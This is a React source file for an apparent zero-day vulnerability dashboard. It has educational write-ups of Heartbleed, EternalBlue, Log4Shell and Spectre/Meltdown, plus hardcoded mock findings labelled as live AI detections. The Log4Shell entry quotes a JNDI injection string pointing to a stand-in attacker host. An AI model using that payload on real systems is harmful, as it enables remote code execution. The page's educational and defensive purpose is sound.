"use client"

import { useState, useEffect } from 'react'
import { Card } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { AlertTriangle, Shield, TrendingUp, Search, Download, BookOpen, Lightbulb, Code2, Activity, Bug } from 'lucide-react'

interface Vulnerability {
  id: string
  name: string
  cvss: number
  epss: number
  confidence: number
  category: string
  description: string
  discovered: string
  status: 'new' | 'analyzing' | 'confirmed' | 'mitigated'
  affectedSystems: string[]
  exploitAvailable: boolean
  severity: 'critical' | 'high' | 'medium' | 'low'
}

interface BehaviorAnomaly {
  id: string
  timestamp: string
  anomalyType: string
  confidence: number
  indicators: string[]
  riskScore: number
}

interface HistoricalZeroDay {
  title: string
  cveId: string
  year: number
  cvssScore: number
  severity: 'critical' | 'high'
  description: string
  technicalDetails: string
  affectedSoftware: string[]
  attackVector: string
  impact: string
  discoveryMethod: string
  patchTimeline: string
  realWorldExploits: string[]
  lessonsLearned: string[]
}

const HISTORICAL_ZERO_DAYS: HistoricalZeroDay[] = [
  {
    title: 'Heartbleed (OpenSSL)',
    cveId: 'CVE-2014-0160',
    year: 2014,
    cvssScore: 7.5,
    severity: 'high',
    description: 'Critical vulnerability in OpenSSL cryptographic library allowing attackers to read sensitive memory contents from servers and clients.',
    technicalDetails: 'Heartbleed exploited a buffer over-read in OpenSSL\'s TLS heartbeat extension implementation. The heartbeat request allowed clients to ask servers to echo back a message. However, the code failed to validate the length field, allowing attackers to request up to 64KB of server memory per heartbeat. This memory could contain private keys, session tokens, passwords, and other sensitive data. The vulnerability existed in OpenSSL versions 1.0.1 through 1.0.1f.',
    affectedSoftware: ['OpenSSL 1.0.1 - 1.0.1f', 'Web servers (Apache, Nginx)', 'VPN servers', 'Email servers', 'Millions of websites'],
    attackVector: 'Network - Remote exploitation over HTTPS connections without authentication',
    impact: 'Exposure of private encryption keys, user credentials, session tokens, and sensitive data from server memory. Estimated 17% of all HTTPS servers were vulnerable at discovery. Attackers could decrypt past and future encrypted communications if private keys were compromised.',
    discoveryMethod: 'Responsible disclosure by Google Security Team and Codenomicon security researchers through code review and fuzzing of OpenSSL implementation.',
    patchTimeline: 'Discovered: March 2014. Public disclosure: April 7, 2014. Patch released same day (OpenSSL 1.0.1g). Mass patching took months due to widespread deployment.',
    realWorldExploits: [
      'Canadian Revenue Agency breach - 900 taxpayers\' data stolen',
      'Mumsnet UK parenting forum - user account data compromised',
      'Yahoo Mail - potential exposure of user credentials',
      'Widespread scanning and exploitation within hours of disclosure',
      'NSA allegedly exploited before public disclosure (unconfirmed)'
    ],
    lessonsLearned: [
      'Critical infrastructure relies on underfunded open-source projects',
      'Code review of cryptographic implementations is essential',
      'Memory safety issues in C/C++ can have catastrophic consequences',
      'Need for regular security audits of widely-used libraries',
      'Certificate and key rotation should be part of incident response',
      'Heartbeat extension was unnecessary feature that increased attack surface'
    ]
  },
  {
    title: 'EternalBlue (SMBv1)',
    cveId: 'CVE-2017-0144',
    year: 2017,
    cvssScore: 9.3,
    severity: 'critical',
    description: 'Remote code execution vulnerability in Microsoft SMBv1 protocol, allegedly developed as NSA exploit and leaked by Shadow Brokers.',
    technicalDetails: 'EternalBlue exploited a buffer overflow in Microsoft\'s implementation of the Server Message Block (SMBv1) protocol. The vulnerability existed in the srv.sys driver\'s handling of specially crafted packets. Attackers could send malicious SMBv1 packets to execute arbitrary code with SYSTEM privileges without authentication. The exploit worked by sending crafted SMB transaction requests that triggered a buffer overflow in kernel memory, allowing shellcode injection and execution.',
    affectedSoftware: ['Windows Vista', 'Windows 7', 'Windows 8.1', 'Windows 10 (pre-patch)', 'Windows Server 2008/2012/2016'],
    attackVector: 'Network - Remote exploitation via SMB port 445, no user interaction required',
    impact: 'Complete system compromise with SYSTEM-level access. Used in WannaCry ransomware (May 2017) affecting 200,000+ computers across 150 countries including NHS hospitals, FedEx, Telefonica. Also used in NotPetya (June 2017) causing $10 billion in damages. Enabled wormable, self-propagating malware.',
    discoveryMethod: 'Developed by NSA as "EternalBlue" exploit. Stolen and leaked by hacker group "Shadow Brokers" in April 2017. Microsoft had already patched in March 2017 (MS17-010) based on advance warning, but millions remained unpatched.',
    patchTimeline: 'Exploited by NSA: ~2013. Leaked: April 14, 2017. Microsoft patch: March 14, 2017 (MS17-010). Emergency patches for unsupported Windows XP/Server 2003: May 2017 after WannaCry outbreak.',
    realWorldExploits: [
      'WannaCry ransomware - 230,000+ computers, 150 countries, May 2017',
      'NotPetya - $10B damages, targeted Ukraine infrastructure, June 2017',
      'BadRabbit ransomware - Eastern Europe, October 2017',
      'Retefe banking Trojan - Switzerland, Austria, 2018',
      'Ongoing exploitation in targeted attacks and cryptominers',
      'Used by nation-state actors for espionage campaigns'
    ],
    lessonsLearned: [
      'Legacy protocols (SMBv1) should be disabled when not needed',
      'Patch management is critical - exploit leaked after patch availability',
      'Government-developed exploits can leak and cause global damage',
      'Need for coordinated vulnerability disclosure between agencies',
      'Wormable vulnerabilities pose existential risk to internet infrastructure',
      'Organizations need asset inventory to track vulnerable systems',
      'Critical to patch even end-of-life systems in emergencies'
    ]
  },
  {
    title: 'Log4Shell (Log4j)',
    cveId: 'CVE-2021-44228',
    year: 2021,
    cvssScore: 10.0,
    severity: 'critical',
    description: 'Remote code execution in Apache Log4j logging library via JNDI lookup injection, affecting millions of applications worldwide.',
    technicalDetails: 'Log4Shell exploited Log4j\'s JNDI (Java Naming and Directory Interface) lookup feature. When Log4j processes a specially crafted string like "${jndi:ldap://evil.com/a}", it attempts to retrieve and execute code from the specified LDAP/RMI server. This allows unauthenticated remote code execution with the privileges of the Java application. The vulnerability existed because Log4j recursively evaluated expressions in log messages, and JNDI lookups were enabled by default with insufficient validation.',
    affectedSoftware: ['Apache Log4j 2.0-beta9 to 2.14.1', 'Minecraft servers', 'iCloud', 'Steam', 'Cloudflare', 'Twitter', 'Tesla', 'Amazon AWS', 'VMware products', 'Countless enterprise applications'],
    attackVector: 'Network - Injection via any input logged by application (HTTP headers, usernames, form fields, etc.). Unauthenticated.',
    impact: 'Remote code execution on millions of servers worldwide. CISA director called it "one of the most serious vulnerabilities I\'ve seen in my career." Estimated 35,000+ Java packages affected. Attackers deployed cryptocurrency miners, ransomware, botnets, and backdoors within hours. Nation-state actors actively exploiting for espionage.',
    discoveryMethod: 'Discovered by Chen Zhaojun of Alibaba Cloud Security Team on November 24, 2021. Reported to Apache Foundation. Proof-of-concept published on Twitter before patches were widely available, leading to immediate mass exploitation.',
    patchTimeline: 'Discovered: Nov 24, 2021. Apache notified: Nov 24, 2021. Initial patch (2.15.0): Dec 6, 2021. Incomplete - second patch (2.16.0): Dec 13, 2021. Third patch (2.17.0): Dec 17, 2021. Remediation took months due to transitive dependencies.',
    realWorldExploits: [
      'Minecraft servers - initial public demonstration vector',
      'Cryptocurrency miners deployed on thousands of servers globally',
      'Ransomware groups (Khonsari, Orcus) exploiting within 72 hours',
      'Chinese APT groups (APT41, Hafnium) targeting government agencies',
      'Iranian APT groups targeting Israeli infrastructure',
      'Belgian Ministry of Defense - confirmed compromise',
      'VMware Horizon servers - mass exploitation in December 2021',
      'Persistence mechanisms found months after initial patching'
    ],
    lessonsLearned: [
      'Logging libraries are critical infrastructure - security often overlooked',
      'Default-on features (JNDI lookup) need security review',
      'Supply chain vulnerabilities affect entire ecosystem',
      'Need for Software Bill of Materials (SBOM) to track dependencies',
      'Patching transitive dependencies is extremely difficult at scale',
      'Coordinated disclosure timing crucial - public PoC caused harm',
      'Organizations need dependency scanning and upgrade automation',
      'Runtime Application Self-Protection (RASP) could mitigate unknown vulnerabilities'
    ]
  },
  {
    title: 'Spectre & Meltdown',
    cveId: 'CVE-2017-5753, CVE-2017-5715, CVE-2017-5754',
    year: 2018,
    cvssScore: 5.6,
    severity: 'high',
    description: 'Hardware vulnerabilities in modern CPU speculative execution allowing unauthorized memory access across security boundaries.',
    technicalDetails: 'Spectre and Meltdown exploit CPU speculative execution and out-of-order execution optimizations. Meltdown (CVE-2017-5754) breaks isolation between user applications and operating system, allowing programs to read kernel memory. Spectre (CVE-2017-5753, CVE-2017-5715) breaks isolation between applications, allowing malicious programs to trick other applications into leaking secrets. These work by using speculative execution to access forbidden memory, then using cache timing side-channels to extract the speculatively-accessed data before the CPU realizes the access was illegal and rolls back.',
    affectedSoftware: ['Intel processors (1995-2018)', 'AMD processors', 'ARM processors', 'Virtually all computers, smartphones, tablets', 'Cloud infrastructure', 'Embedded systems'],
    attackVector: 'Local - Requires code execution on target system. Can be delivered via JavaScript in browsers, malicious apps, or through shared hosting environments.',
    impact: 'Breaks fundamental security guarantees of modern computing. Allows reading arbitrary memory including passwords, encryption keys, and sensitive data. Affects billions of devices. Cloud providers had to redesign infrastructure isolation. Performance impact from mitigations (5-30% for some workloads). Unfixable in hardware - requires microcode updates and OS patches with performance penalties.',
    discoveryMethod: 'Independently discovered by multiple research teams: Google Project Zero (Jann Horn), Graz University of Technology, Cyberus Technology, and Rambus. Coordinated disclosure planned for January 2018 but forced early after public speculation.',
    patchTimeline: 'Discovered: 2017. Coordinated disclosure: January 3, 2018. OS patches: January 2018 (emergency). Microcode updates: Rolling basis throughout 2018-2019. Browser mitigations: January 2018. Hardware fixes: New CPU generations (2019+).',
    realWorldExploits: [
      'Academic demonstrations successful on major browsers',
      'Cloud provider memory isolation concerns',
      'No confirmed real-world attacks detected (as of public record)',
      'Theoretical risk to cloud hosting, shared environments',
      'Used as research basis for dozens of follow-up side-channel attacks',
      'Variants continue to be discovered (e.g., Spectre-NG, ZombieLoad, RIDL)'
    ],
    lessonsLearned: [
      'CPU microarchitecture optimizations can introduce security vulnerabilities',
      'Hardware vulnerabilities affect entire computing ecosystem',
      'Side-channel attacks are practical, not just theoretical',
      'Unfixable hardware flaws require software workarounds with performance costs',
      'Need for secure hardware design principles and formal verification',
      'Coordinated disclosure critical for hardware vulnerabilities',
      'Cloud security model requires re-evaluation with hardware side-channels',
      'Defense-in-depth essential when hardware guarantees fail'
    ]
  }
]

export default function ZeroDayPage() {
  const [activeTab, setActiveTab] = useState('discover')
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>([])
  const [anomalies, setAnomalies] = useState<BehaviorAnomaly[]>([])
  const [loading, setLoading] = useState(false)
  const [searchTerm, setSearchTerm] = useState('')
  const [selectedSeverity, setSelectedSeverity] = useState<string>('all')

  useEffect(() => {
    loadVulnerabilities()
    loadAnomalies()

    const interval = setInterval(() => {
      loadAnomalies()
    }, 30000)

    return () => clearInterval(interval)
  }, [])

  const loadVulnerabilities = async () => {
    setLoading(true)
    try {
      // Mock data
      const mockVulns: Vulnerability[] = [
        {
          id: 'ZD-2025-001',
          name: 'Remote Code Execution in Authentication Module',
          cvss: 9.8,
          epss: 0.92,
          confidence: 87,
          category: 'Authentication Bypass',
          description: 'AI-detected anomalous behavior in JWT validation allowing arbitrary code execution',
          discovered: new Date().toISOString(),
          status: 'analyzing',
          affectedSystems: ['auth-service', 'api-gateway'],
          exploitAvailable: false,
          severity: 'critical'
        },
        {
          id: 'ZD-2025-002',
          name: 'SQL Injection via API Parameter Pollution',
          cvss: 8.6,
          epss: 0.78,
          confidence: 93,
          category: 'Injection',
          description: 'Novel parameter pollution technique bypassing input validation',
          discovered: new Date(Date.now() - 3600000).toISOString(),
          status: 'confirmed',
          affectedSystems: ['database-api', 'admin-panel'],
          exploitAvailable: true,
          severity: 'high'
        },
        {
          id: 'ZD-2025-003',
          name: 'Privilege Escalation through Cache Poisoning',
          cvss: 7.2,
          epss: 0.45,
          confidence: 76,
          category: 'Privilege Escalation',
          description: 'Cache poisoning vulnerability allowing role elevation',
          discovered: new Date(Date.now() - 7200000).toISOString(),
          status: 'new',
          affectedSystems: ['redis-cache', 'session-manager'],
          exploitAvailable: false,
          severity: 'high'
        }
      ]
      setVulnerabilities(mockVulns)
    } catch (error) {
      console.error('Failed to load vulnerabilities:', error)
    } finally {
      setLoading(false)
    }
  }

  const loadAnomalies = async () => {
    try {
      const mockAnomalies: BehaviorAnomaly[] = [
        {
          id: 'AN-' + Date.now(),
          timestamp: new Date().toISOString(),
          anomalyType: 'Unusual Memory Access Pattern',
          confidence: 84,
          indicators: ['heap_spray_detected', 'rop_chain_pattern', 'shellcode_signature'],
          riskScore: 91
        },
        {
          id: 'AN-' + (Date.now() - 1000),
          timestamp: new Date(Date.now() - 60000).toISOString(),
          anomalyType: 'Abnormal Network Behavior',
          confidence: 72,
          indicators: ['dns_tunneling', 'c2_beaconing', 'data_exfiltration'],
          riskScore: 78
        }
      ]
      setAnomalies(mockAnomalies)
    } catch (error) {
      console.error('Failed to load anomalies:', error)
    }
  }

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'bg-red-500/20 text-red-400 border-red-500/50'
      case 'high': return 'bg-orange-500/20 text-orange-400 border-orange-500/50'
      case 'medium': return 'bg-yellow-500/20 text-yellow-400 border-yellow-500/50'
      case 'low': return 'bg-blue-500/20 text-blue-400 border-blue-500/50'
      default: return 'bg-gray-500/20 text-gray-400 border-gray-500/50'
    }
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'new': return 'bg-purple-500/20 text-purple-400 border-purple-500/50'
      case 'analyzing': return 'bg-blue-500/20 text-blue-400 border-blue-500/50'
      case 'confirmed': return 'bg-red-500/20 text-red-400 border-red-500/50'
      case 'mitigated': return 'bg-green-500/20 text-green-400 border-green-500/50'
      default: return 'bg-gray-500/20 text-gray-400 border-gray-500/50'
    }
  }

  const filteredVulnerabilities = vulnerabilities.filter(vuln => {
    const matchesSearch = vuln.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         vuln.description.toLowerCase().includes(searchTerm.toLowerCase())
    const matchesSeverity = selectedSeverity === 'all' || vuln.severity === selectedSeverity
    return matchesSearch && matchesSeverity
  })

  return (
    <div className="min-h-screen bg-background p-8 pt-32">
      {/* Header */}
      <div className="mb-8">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h1 className="text-3xl font-bold bg-gradient-to-r from-purple-400 to-pink-600 bg-clip-text text-transparent">
              Zero-Day Discovery
            </h1>
            <p className="text-muted-foreground mt-2">AI-powered vulnerability detection and behavior analysis</p>
          </div>
          <Button className="bg-gradient-to-r from-purple-500 to-pink-600">
            <Download className="mr-2 h-4 w-4" />
            Export Report
          </Button>
        </div>

        {/* Description Banner */}
        <div className="bg-purple-500/10 border border-purple-500/30 rounded-lg p-4 flex items-start gap-3">
          <Bug className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
          <div>
            <p className="text-sm text-muted-foreground leading-relaxed">
              <strong className="text-foreground">What this page does:</strong> This AI-powered zero-day discovery system uses advanced machine learning to detect previously unknown vulnerabilities before they're publicly disclosed. It combines behavioral anomaly detection, pattern recognition, and automated fuzzing to identify security flaws that traditional scanners miss. The system monitors live behavioral anomalies in real-time and provides comprehensive educational content about famous zero-day vulnerabilities like Heartbleed, EternalBlue, Log4Shell, and Spectre/Meltdown, including their technical details, real-world impact, and lessons learned. You'll learn about CVE/CVSS scoring systems and how to prioritize vulnerabilities using EPSS (Exploit Prediction Scoring System).
            </p>
          </div>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
        <Card className="bg-black/40 border-purple-500/20 p-6">
          <div className="flex items-center justify-between">
            <div>
              <p className="text-gray-400 text-sm">Total Discovered</p>
              <p className="text-3xl font-bold text-white mt-1">{vulnerabilities.length}</p>
            </div>
            <AlertTriangle className="h-8 w-8 text-purple-400" />
          </div>
        </Card>

        <Card className="bg-black/40 border-red-500/20 p-6">
          <div className="flex items-center justify-between">
            <div>
              <p className="text-gray-400 text-sm">Critical</p>
              <p className="text-3xl font-bold text-red-400 mt-1">
                {vulnerabilities.filter(v => v.severity === 'critical').length}
              </p>
            </div>
            <Shield className="h-8 w-8 text-red-400" />
          </div>
        </Card>

        <Card className="bg-black/40 border-orange-500/20 p-6">
          <div className="flex items-center justify-between">
            <div>
              <p className="text-gray-400 text-sm">High Risk</p>
              <p className="text-3xl font-bold text-orange-400 mt-1">
                {vulnerabilities.filter(v => v.severity === 'high').length}
              </p>
            </div>
            <TrendingUp className="h-8 w-8 text-orange-400" />
          </div>
        </Card>

        <Card className="bg-black/40 border-green-500/20 p-6">
          <div className="flex items-center justify-between">
            <div>
              <p className="text-gray-400 text-sm">Avg Confidence</p>
              <p className="text-3xl font-bold text-green-400 mt-1">
                {Math.round(vulnerabilities.reduce((acc, v) => acc + v.confidence, 0) / vulnerabilities.length || 0)}%
              </p>
            </div>
            <TrendingUp className="h-8 w-8 text-green-400" />
          </div>
        </Card>
      </div>

      {/* Main Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
        <TabsList className="grid w-full grid-cols-3 h-auto p-1 bg-muted">
          <TabsTrigger value="discover" className="data-[state=active]:bg-primary">
            <Bug className="mr-2 h-4 w-4" />
            Discover
          </TabsTrigger>
          <TabsTrigger value="learn" className="data-[state=active]:bg-primary">
            <BookOpen className="mr-2 h-4 w-4" />
            Learn
          </TabsTrigger>
          <TabsTrigger value="examples" className="data-[state=active]:bg-primary">
            <Lightbulb className="mr-2 h-4 w-4" />
            Historical Cases
          </TabsTrigger>
        </TabsList>

        {/* Discover Tab */}
        <TabsContent value="discover" className="space-y-6">
          {/* Search and Filters */}
          <div className="flex gap-4">
            <div className="relative flex-1">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
              <Input
                placeholder="Search vulnerabilities..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pl-10 bg-black/40 border-purple-500/20"
              />
            </div>
            <select
              value={selectedSeverity}
              onChange={(e) => setSelectedSeverity(e.target.value)}
              className="px-4 py-2 bg-black/40 border border-purple-500/20 rounded-lg text-white"
            >
              <option value="all">All Severities</option>
              <option value="critical">Critical</option>
              <option value="high">High</option>
              <option value="medium">Medium</option>
              <option value="low">Low</option>
            </select>
          </div>

          {/* Vulnerabilities List */}
          <div className="space-y-4">
            <h2 className="text-xl font-semibold text-white">Discovered Vulnerabilities</h2>
            {filteredVulnerabilities.map((vuln) => (
              <Card key={vuln.id} className="bg-black/40 border-purple-500/20 p-6 hover:border-purple-500/40 transition-all">
                <div className="space-y-4">
                  {/* Header */}
                  <div className="flex items-start justify-between">
                    <div className="space-y-2">
                      <div className="flex items-center gap-3">
                        <h3 className="text-xl font-semibold text-white">{vuln.name}</h3>
                        <Badge className={getSeverityColor(vuln.severity)}>
                          {vuln.severity.toUpperCase()}
                        </Badge>
                        <Badge className={getStatusColor(vuln.status)}>
                          {vuln.status}
                        </Badge>
                      </div>
                      <p className="text-gray-400 text-sm">{vuln.id}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-2xl font-bold text-white">{vuln.cvss}</p>
                      <p className="text-gray-400 text-sm">CVSS Score</p>
                    </div>
                  </div>

                  {/* Description */}
                  <p className="text-gray-300">{vuln.description}</p>

                  {/* Metrics */}
                  <div className="grid grid-cols-3 gap-4">
                    <div className="bg-purple-500/10 rounded-lg p-3">
                      <p className="text-gray-400 text-xs mb-1">EPSS Score</p>
                      <p className="text-lg font-semibold text-purple-400">{(vuln.epss * 100).toFixed(1)}%</p>
                    </div>
                    <div className="bg-blue-500/10 rounded-lg p-3">
                      <p className="text-gray-400 text-xs mb-1">AI Confidence</p>
                      <p className="text-lg font-semibold text-blue-400">{vuln.confidence}%</p>
                    </div>
                    <div className="bg-green-500/10 rounded-lg p-3">
                      <p className="text-gray-400 text-xs mb-1">Exploit Available</p>
                      <p className="text-lg font-semibold text-green-400">{vuln.exploitAvailable ? 'Yes' : 'No'}</p>
                    </div>
                  </div>

                  {/* Affected Systems */}
                  <div>
                    <p className="text-gray-400 text-sm mb-2">Affected Systems:</p>
                    <div className="flex flex-wrap gap-2">
                      {vuln.affectedSystems.map((system) => (
                        <Badge key={system} className="bg-gray-500/20 text-gray-300 border-gray-500/50">
                          {system}
                        </Badge>
                      ))}
                    </div>
                  </div>

                  {/* Actions */}
                  <div className="flex gap-2">
                    <Button size="sm" className="bg-purple-500/20 hover:bg-purple-500/30 text-purple-400">
                      Analyze
                    </Button>
                    <Button size="sm" className="bg-blue-500/20 hover:bg-blue-500/30 text-blue-400">
                      Generate Mitigation
                    </Button>
                    <Button size="sm" className="bg-green-500/20 hover:bg-green-500/30 text-green-400">
                      Export Details
                    </Button>
                  </div>
                </div>
              </Card>
            ))}
          </div>

          {/* Live Anomalies */}
          <div className="space-y-4">
            <h2 className="text-xl font-semibold text-white">Live Behavioral Anomalies</h2>
            <div className="bg-black/40 border border-purple-500/20 rounded-lg p-4 mb-4">
              <p className="text-gray-400 text-sm">
                AI monitors system behavior in real-time, detecting anomalies that may indicate zero-day exploitation attempts. Updates every 30 seconds.
              </p>
            </div>
            {anomalies.map((anomaly) => (
              <Card key={anomaly.id} className="bg-black/40 border-orange-500/20 p-6">
                <div className="space-y-3">
                  <div className="flex items-start justify-between">
                    <div>
                      <h3 className="text-lg font-semibold text-white">{anomaly.anomalyType}</h3>
                      <p className="text-gray-400 text-sm">
                        {new Date(anomaly.timestamp).toLocaleString()}
                      </p>
                    </div>
                    <div className="text-right">
                      <p className="text-xl font-bold text-orange-400">{anomaly.riskScore}</p>
                      <p className="text-gray-400 text-sm">Risk Score</p>
                    </div>
                  </div>

                  <div>
                    <p className="text-gray-400 text-sm mb-2">Indicators:</p>
                    <div className="flex flex-wrap gap-2">
                      {anomaly.indicators.map((indicator, idx) => (
                        <Badge key={idx} className="bg-red-500/20 text-red-400 border-red-500/50">
                          {indicator}
                        </Badge>
                      ))}
                    </div>
                  </div>

                  <div className="flex items-center gap-4">
                    <div className="flex-1">
                      <p className="text-gray-400 text-sm mb-1">Confidence</p>
                      <div className="h-2 bg-gray-700 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-gradient-to-r from-orange-500 to-red-500"
                          style={{ width: `${anomaly.confidence}%` }}
                        />
                      </div>
                    </div>
                    <p className="text-white font-semibold">{anomaly.confidence}%</p>
                  </div>
                </div>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Learn Tab */}
        <TabsContent value="learn" className="space-y-6">
          <Card className="bg-black/40 border-purple-500/20 p-8">
            <div className="space-y-8">
              <div>
                <h2 className="text-2xl font-bold text-white mb-4 flex items-center gap-3">
                  <Shield className="h-7 w-7 text-purple-400" />
                  Understanding Zero-Day Vulnerabilities
                </h2>
                <p className="text-gray-300 text-lg leading-relaxed">
                  A zero-day vulnerability is a software security flaw that is unknown to the software vendor or for which no patch exists.
                  The term "zero-day" refers to the number of days the vendor has known about the vulnerability - zero days to fix it before attackers exploit it.
                </p>
              </div>

              <div className="border-t border-gray-700 pt-8">
                <h3 className="text-xl font-semibold text-white mb-4">CVE System: Common Vulnerabilities and Exposures</h3>
                <div className="bg-gradient-to-r from-blue-500/10 to-cyan-500/10 border border-blue-500/30 rounded-lg p-6">
                  <p className="text-gray-300 mb-4">
                    The CVE system is a dictionary of publicly known cybersecurity vulnerabilities and exposures.
                    Each CVE ID provides a standardized identifier for a specific vulnerability, enabling security professionals
                    worldwide to share information and coordinate responses.
                  </p>
                  <div className="bg-black/40 rounded-lg p-4 border border-gray-700">
                    <p className="text-sm text-gray-400 mb-2"><strong>CVE ID Format:</strong></p>
                    <p className="text-cyan-400 font-mono text-lg mb-3">CVE-2024-12345</p>
                    <ul className="list-disc list-inside text-gray-300 text-sm space-y-1">
                      <li><strong>CVE</strong> - Common Vulnerabilities and Exposures identifier</li>
                      <li><strong>2024</strong> - Year the CVE ID was assigned (not necessarily discovered)</li>
                      <li><strong>12345</strong> - Unique sequential number for that year</li>
                    </ul>
                  </div>
                  <div className="mt-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded">
                    <p className="text-sm text-blue-300">
                      <strong>CVE Lifecycle:</strong> Request → Reserved → Published → Modified → Rejected (rare)
                    </p>
                  </div>
                </div>
              </div>

              <div className="border-t border-gray-700 pt-8">
                <h3 className="text-xl font-semibold text-white mb-4">CVSS: Common Vulnerability Scoring System</h3>
                <div className="space-y-6">
                  <div className="bg-gradient-to-r from-purple-500/10 to-pink-500/10 border border-purple-500/30 rounded-lg p-6">
                    <h4 className="text-lg font-semibold text-purple-400 mb-3">CVSS v3.1 Scoring</h4>
                    <p className="text-gray-300 mb-4">
                      CVSS provides a standardized way to assess the severity of vulnerabilities on a scale of 0.0 to 10.0.
                      The score is calculated based on multiple metrics across three groups: Base, Temporal, and Environmental.
                    </p>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="bg-black/40 rounded-lg p-4 border border-gray-700">
                        <p className="text-sm text-gray-400 mb-2"><strong>Base Metrics (intrinsic qualities):</strong></p>
                        <ul className="list-disc list-inside text-gray-300 text-sm space-y-1">
                          <li><strong>Attack Vector (AV):</strong> Network, Adjacent, Local, Physical</li>
                          <li><strong>Attack Complexity (AC):</strong> Low, High</li>
                          <li><strong>Privileges Required (PR):</strong> None, Low, High</li>
                          <li><strong>User Interaction (UI):</strong> None, Required</li>
                          <li><strong>Scope (S):</strong> Unchanged, Changed</li>
                          <li><strong>Impact - CIA:</strong> Confidentiality, Integrity, Availability</li>
                        </ul>
                      </div>
                      <div className="bg-black/40 rounded-lg p-4 border border-gray-700">
                        <p className="text-sm text-gray-400 mb-2"><strong>Severity Ratings:</strong></p>
                        <ul className="space-y-2 text-sm">
                          <li className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-red-500"></div>
                            <span className="text-red-400 font-semibold">Critical:</span>
                            <span className="text-gray-300">9.0 - 10.0</span>
                          </li>
                          <li className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-orange-500"></div>
                            <span className="text-orange-400 font-semibold">High:</span>
                            <span className="text-gray-300">7.0 - 8.9</span>
                          </li>
                          <li className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                            <span className="text-yellow-400 font-semibold">Medium:</span>
                            <span className="text-gray-300">4.0 - 6.9</span>
                          </li>
                          <li className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-blue-500"></div>
                            <span className="text-blue-400 font-semibold">Low:</span>
                            <span className="text-gray-300">0.1 - 3.9</span>
                          </li>
                          <li className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-gray-500"></div>
                            <span className="text-gray-400 font-semibold">None:</span>
                            <span className="text-gray-300">0.0</span>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div className="bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-lg p-6">
                    <h4 className="text-lg font-semibold text-green-400 mb-3 flex items-center gap-2">
                      <TrendingUp className="h-5 w-5" />
                      EPSS: Exploit Prediction Scoring System
                    </h4>
                    <p className="text-gray-300 mb-4">
                      EPSS estimates the probability that a vulnerability will be exploited in the wild within the next 30 days.
                      Unlike CVSS which measures severity, EPSS predicts likelihood of exploitation using machine learning on historical data.
                    </p>
                    <div className="bg-black/40 rounded-lg p-4 border border-gray-700">
                      <p className="text-sm text-gray-400 mb-2"><strong>EPSS Score Interpretation:</strong></p>
                      <ul className="list-disc list-inside text-gray-300 text-sm space-y-1">
                        <li><strong>0.90+ (90%):</strong> Extremely high exploitation probability - immediate action required</li>
                        <li><strong>0.50-0.89 (50-89%):</strong> High probability - prioritize patching</li>
                        <li><strong>0.10-0.49 (10-49%):</strong> Moderate probability - patch within SLA</li>
                        <li><strong>&lt;0.10 (&lt;10%):</strong> Low probability - standard remediation timeline</li>
                      </ul>
                    </div>
                    <div className="mt-4 p-3 bg-green-500/10 border border-green-500/30 rounded">
                      <p className="text-sm text-green-300">
                        <strong>Best Practice:</strong> Use CVSS for severity assessment and EPSS for prioritization.
                        A medium CVSS score with high EPSS may be more urgent than a high CVSS with low EPSS.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="border-t border-gray-700 pt-8">
                <h3 className="text-xl font-semibold text-white mb-4">Zero-Day Discovery Methods</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="bg-blue-500/10 border border-blue-500/30 rounded-lg p-5">
                    <h4 className="font-semibold text-blue-400 mb-3 flex items-center gap-2">
                      <Code2 className="h-5 w-5" />
                      Traditional Methods
                    </h4>
                    <ul className="space-y-2 text-gray-300 text-sm">
                      <li className="flex gap-2">
                        <span className="text-blue-400">•</span>
                        <span><strong>Fuzzing:</strong> Sending malformed data to find crashes and memory corruption</span>
                      </li>
                      <li className="flex gap-2">
                        <span className="text-blue-400">•</span>
                        <span><strong>Code Review:</strong> Manual analysis of source code for security flaws</span>
                      </li>
                      <li className="flex gap-2">
                        <span className="text-blue-400">•</span>
                        <span><strong>Reverse Engineering:</strong> Analyzing compiled binaries to find vulnerabilities</span>
                      </li>
                      <li className="flex gap-2">
                        <span className="text-blue-400">•</span>
                        <span><strong>Penetration Testing:</strong> Simulated attacks to identify weaknesses</span>
                      </li>
                    </ul>
                  </div>

                  <div className="bg-purple-500/10 border border-purple-500/30 rounded-lg p-5">
                    <h4 className="font-semibold text-purple-400 mb-3 flex items-center gap-2">
                      <Activity className="h-5 w-5" />
                      AI-Powered Discovery
                    </h4>
                    <ul className="space-y-2 text-gray-300 text-sm">
                      <li className="flex gap-2">
                        <span className="text-purple-400">•</span>
                        <span><strong>Behavioral Analysis:</strong> ML detects anomalous program behavior indicating exploitation</span>
                      </li>
                      <li className="flex gap-2">
                        <span className="text-purple-400">•</span>
                        <span><strong>Pattern Recognition:</strong> AI identifies exploit patterns from historical data</span>
                      </li>
                      <li className="flex gap-2">
